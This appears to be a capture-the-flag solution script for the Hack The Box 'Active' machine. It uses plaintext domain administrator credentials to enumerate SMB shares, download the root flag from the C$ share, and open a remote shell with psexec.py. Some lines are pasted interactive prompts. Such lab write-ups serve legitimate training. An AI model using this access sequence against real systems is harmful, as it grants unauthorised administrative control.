#! /bin/bash

smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968
smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
smb: \> get \users\administrator\desktop\root.txt
cat root.txt

# Get a shell
psexec.py active.htb/administrator@10.10.10.100
C:\Windows\system32>whoami

